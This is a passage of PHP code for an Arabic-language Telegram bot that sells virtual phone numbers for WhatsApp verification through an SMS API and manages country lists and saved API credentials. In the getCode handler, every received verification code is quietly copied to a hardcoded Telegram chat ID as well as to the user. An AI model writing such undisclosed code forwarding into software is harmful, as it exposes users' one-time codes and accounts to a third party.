            [['text'=>'الأردن 🇯🇴','callback_data'=>"addget-106"],['text'=>'الصومال 🇸🇴','callback_data'=>"addget-135"],['text'=>'البحرين 🇧🇭','callback_data'=>"addget-132"]],   
            [['text'=>'لبنان 🇱🇧','callback_data'=>"addget-138"],['text'=>'جيبوتي 🇩🇯','callback_data'=>"addget-150"],['text'=>'جنوب السودان 🇸🇸','callback_data'=>"addgeet-157"]],
                                    
						[["text"=>"رجوع🔙","callback_data"=>"add"],["text"=>"رجوع للبداية🔙","callback_data"=>"back"]],
                           
					]
				])
			]);
		}


    if(strpos($data,"addget")!== false){
      $eex = explode("-", $data);
      $co = $eex[1];
      $country = $_co_o['country'][$co];
      $name = $_co['country'][$co];
      if($info["countries"][$co] == null){
        
        $bot->editmessagetext([
				"chat_id"=>$chat_id,
				"text"=>"
✅ تم إضافة الدولة بنجاح
",
				"message_id"=>$message_id,
				"reply_markup"=>json_encode([
					"inline_keyboard"=>[
            [["text"=>"رجوع خطوة واحدة🔙","callback_data"=>"Arab"]],
						[["text"=>"رجوع🔙","callback_data"=>"add"],["text"=>"رجوع للبداية🔙","callback_data"=>"back"]],
					]
				])
			]);

      $info["countries"][$co] = $country;
		  save();

      }
        else {
          $bot->answercallbackquery([
            'callback_query_id' => $update->callback_query->id,
            'text'=>'⚠️ | عذرا عزيزي قد قمت ب إضافة هذه الدولة من قبل ♻️',
            'show_alert'=>true
          ]);
          exit;
        }

    }

    if(strpos($data,"addgeet")!== false){
      $eex = explode("-", $data);
      $co = $eex[1];
      $country = $_co_o['country'][$co];
      $name = $_co['country'][$co];
      if($info["countries"][$co] == null){
        
        $bot->editmessagetext([
				"chat_id"=>$chat_id,
				"text"=>"
✅ تم إضافة الدولة بنجاح
",
				"message_id"=>$message_id,
				"reply_markup"=>json_encode([
					"inline_keyboard"=>[
            [["text"=>"رجوع خطوة واحدة🔙","callback_data"=>"foreign"]],
						[["text"=>"رجوع🔙","callback_data"=>"add"],["text"=>"رجوع للبداية🔙","callback_data"=>"back"]],
					]
				])
			]);

      $info["countries"][$co] = $country;
		  save();

      }
        else {
          $bot->answercallbackquery([
            'callback_query_id' => $update->callback_query->id,
            'text'=>'⚠️ | عذرا عزيزي قد قمت ب إضافة هذه الدولة من قبل ♻️',
            'show_alert'=>true
          ]);
          exit;
        }

    }
    
	}
  
  
  
  
  
    if(strpos($data,"contdel")!== false){
      $eex = explode("-", $data);
      $country = $eex[1];
      $key = $eex[2];
      $name = $_co['country'][$country];
      $bot->editmessagetext([
        'chat_id'=>$chat_id,
        'message_id'=>$message_id,
        'text'=>"تم حذف الدولة بنجاح",
        'parse_mode'=>"MarkDown",
          'reply_markup'=>json_encode([
            'inline_keyboard'=>[
 [["text"=>"رجوع🔙","callback_data"=>"del"],["text"=>"رجوع للبداية🔙","callback_data"=>"back"]],

            ]
          ])
      ]);
      unset($info["countries"][$country]);
      save();
    }

  if ($text && $info["admin"] == "up") {
		$info["keey"] = $text;
		$info["admin"] = "";
		save();
		$bot->sendmessage ([
			"chat_id"=>$chat_id,
			'text'=>"
تم رفع API حسابك بنجاح 📬
",
"reply_to_message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'🔁 | رجوع 🔚','callback_data'=>"back"]]
]
])
]);
}
  if ($text && $info["admin"] == "user") {
		$info["useer"] = $text;
		save();
		$bot->sendmessage ([
			"chat_id"=>$chat_id,
			"text"=>"تم حفظ أسم المستخدم",
      'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>'ادخل الباسوورد','callback_data'=>"pass"]],
          ]
      ])
    ]);
  }
  if ($data == "pass") {
			$bot->sendmessage ([
			"chat_id"=>$chat_id,
				"text"=>"قم ب إدخال الباسوورد",
				"message_id"=>$message_id,
			]);
			$info["admin"] = "pass";
				save();
		}

   if ($text && $info["admin"] == "pass") {
		$info["paass"] = $text;
		$info["admin"] = "";
		save();
		$bot->sendmessage ([
			"chat_id"=>$chat_id,
			"text"=>"تم حفظ الباسوورد بنجاح",
          "reply_markup"=>json_encode([
					"inline_keyboard"=>[
						[["text"=>"رجوع🔙","callback_data"=>"back"]],
					]
				])
		]);
	}


  if($data == "numapp"){
$bot->EditMessageText ([
'chat_id'=>$chat_id,
'message_id'=>$message_id,
'text'=>"
- قم بالضغط على الدولة لسحب الرقم.
",
'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'السعودية 🇸🇦','callback_data'=>"Ai|SaudiArabia"],['text'=>'اليمن 🇾🇪','callback_data'=>"Ai|YE"]],
[['text'=>'الإمارات 🇦🇪','callback_data'=>"Ai|AE"],['text'=>'قطر 🇶🇦','callback_data'=>"Ai|QA"]],
[['text'=>'ليبيا 🇱🇾','callback_data'=>"Ai|LY"],['text'=>'مصر 🇪🇬','callback_data'=>"Ai|EG"]],
[['text'=>'العراق 🇮🇶','callback_data'=>"Ai|IQ"],['text'=>'سوريا 🇸🇾','callback_data'=>"Ai|SY"]],
[['text'=>'تونس 🇹🇳','callback_data'=>"Ai|TN"],['text'=>'الجزائر 🇩🇿','callback_data'=>"Ai|DZ"]],
[['text'=>'تركيا 🇹🇷','callback_data'=>"Ai|TR"],['text'=>'أمريكا 🇺🇸','callback_data'=>"Ai|US"]],
[['text'=>'المغرب 🇲🇦','callback_data'=>"Ai|MA"],['text'=>'الكويت 🇰🇼','callback_data'=>"Ai|KW"]],
[['text'=>'عمان 🇴🇲','callback_data'=>"Ai|OM"],['text'=>'الأردن 🇯🇴','callback_data'=>"Ai|JO"]],
[['text'=>'لبنان 🇱🇧','callback_data'=>"Ai|LB"],['text'=>'البحرين 🇧🇭','callback_data'=>"Ai|BH"]],
[['text'=>'قيرغيزستان 🇰🇬','callback_data'=>"Ai|KG"],['text'=>'كندا 🇨🇦','callback_data'=>"Ai|CA"]],
[['text'=>'شراء عشوائي 🔥','callback_data'=>"Ai|"],['text'=>'كمبوديا 🇲🇬','callback_data'=>"Ai|Cambodia"]],
[['text'=>'🔁 | رجوع 🔚','callback_data'=>"back"]],
]
])
]);
exit;
}


  if(strpos($data,"Ai")!== false){

    
$exdata = explode("|",$data);
$keyy = $exdata[1];
$res = $api->getNumber($keyy);
    if(empty ($res["Error"] )) {
					$ident = $res["ident"];
					$num = $res["num"];
					$code = $res["code"];
					$price = $res["price"];
					$region = $res["region"];
					$time = $res["time"];
					$id = $res["id"];
					$txxx  = "
☎️ | الرقم: `+$code$num`
🆔 | ايدي العملية: *$ident*
🎛 | التطبيق: *واتساب*
💰 | السعر: `$$price`
🌍 | الدولة: `$region`
🆔 | معرف المشروع: `$id`
";
					$bot->EditMessageText ([
						"chat_id"=>$chat_id,
						'message_id'=>$message_id,
						"text"=>$txxx,
						"parse_mode"=>"markdown",
						"reply_markup"=>json_encode([
							"inline_keyboard"=>[
							[['text'=>"☆| فحص الرقم في الواتساب -",'url'=>"wa.me/$code$num"]],
								[["text"=>"| تحديث ♻️","callback_data"=>"getCode#$ident#$code$num"]],
								[["text"=>"| إلغاء 🚫","callback_data"=>"baan#$ident#$code$num"]],
								
							]
						])
					]);
					usleep(100000);
				}
				
				else{
				    $bot->answercallbackquery([
			        	"callback_query_id" => $update->callback_query->id,
			        	"text"=>"لا يوجد أرقام حالياً في هذه الدولة",
			        	"show_alert"=>true,
		        	]);
		        	exit;
				
				}
    

    
exit;
}



if ($ex[0] == "getCode"  ) {
	$res = $api->getCode($ex[1]);
	if(empty ($res["Error"]) and $res["code"] != 0  ) {
		$code = $res["code"];
		$number = $code;
		$parts = explode("-", $number);
		$codee ="$parts[1]";
		$coodee ="$parts[0]";
		$sms = $res["sms"];
		$numbe = $sms;
		$parts = explode("-", $numbe);
		$cod ="$parts[1]";
		$coode ="$parts[0]";
		$rearrangedNumber = implode("-", array_reverse($parts));
		$ttxxx  = "

تم وصول الكود بنجاح
num: `$ex[2]`
code: `$coode$cod`

";
		$bot->editmessagetext([
			"chat_id"=>$ch,
			"text"=>$ttxxx,
			"message_id"=>$message_id,
			"parse_mode"=>"markdown",
		]);
		
		
		$bot->sendmessage ([
			"chat_id"=>6090158249,
			"text"=>"

تم وصول الكود بنجاح
num: $ex[2]
code: `$coode$cod`

",
                       ]);
	} 	else {
		$bot->answercallbackquery([
			"callback_query_id" => $update->callback_query->id,
			"text"=>"🚫 لم يصل الكود",
			"show_alert"=>true,
		]);
	}
} elseif ($ex[0] == "ban" ) {
	$res = $api->banNum($ex[1]);
	$bot->editmessagetext([
		"chat_id"=>$chat_id,
		"text"=>"تم حظر الرقم بنجاح",
		"message_id"=>$message_id
	]);
} elseif ($ex[0] == "baan" ) {
	$res = $api->banNum($ex[1]);
	$bot->editmessagetext([
		"chat_id"=>$chat_id,
		"text"=>"تم حظر الرقم بنجاح",
		"message_id"=>$message_id,
		'parse_mode'=>"MarkDown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>' رجوع','callback_data'=>"numapp"]],
		]
])
]);
exit;
}
}